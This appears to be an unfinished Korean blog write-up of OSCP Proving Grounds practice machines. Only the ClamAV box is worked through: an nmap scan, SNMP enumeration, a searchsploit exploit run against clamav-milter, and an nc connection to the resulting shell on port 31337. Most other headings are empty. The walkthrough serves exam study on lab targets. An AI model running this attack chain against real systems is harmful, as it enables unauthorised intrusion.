---
layout: post
title: OSCP Proving Ground
subtitle: OSCP Proving Ground WriteUp
author: g3rm
categories:
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
sidebar:
---

## Info
OSCP 자격증 합격을 위해 유용한 문제들로 구성된 [리스트](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)를 참고하여 풀이 방법을 남깁니다.

## Linux 
### ClamAV : 25 SMTP
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.xxx.xxx -oN xxx.xxx_allport
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.185], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info

# smtp get info
snmp-check 192.168.xxx.xxx -c public
[*] Processes:

  Id                    Status                Name                  Path                  Parameters                       
  3779                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl


# 실행중인 process 중 clamav-milter 에 취약점 있음
searchsploit clamav-milter
searchsploit -m 4761
perl 4761.pl 192.168.xxx.xxx
nc -nv 192.168.xxx.xxx 31337
```

### Pelican
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.180.98 -oN 180.98_allport




```

### Payday
```shell

```
### Snookums
```shell

```
### Bratarina
```shell

```
### Pebbles
```shell

```
### Nibbles
```shell

```
### Hetemit
```shell

```
### ZenPhoto
```shell

```
### Nukem

### Cockpit

### Clue

### Extplorer

### Postfish

### Hawat

### Walla

### PC

### Apex

### Sorcerer

### Sybaris

### Peppo

### Hunit

### Readys

### Astronaut

### Bullybox

### Marketing

### Exfiltrated

### Fanatastic

### QuackerJack

### Wombo

### Flu

### Roquefort

### Levram

### Mzeeav

### LaVita

### Xposedapi

### Zipper

### Workaholic

### Fired

### Scrutiny

### SPX

### Vmdak

### Mantis

### BitForge


### WallpaperHub

### Zab

### SpiderSociety



## Windows
### Kevin

### Internal

### Algernon

### Jacko

### Craft

### Squid

### Nickel

### MedJed

### Billyboss

### Shenzi

### AuthBy

### Slort

### Hepet

### DVR4

### Mice

### Monster

### Fish


## AD
### Access

### Resourced

### Nagoya

### Hokkaido

### Hutch

### Vault










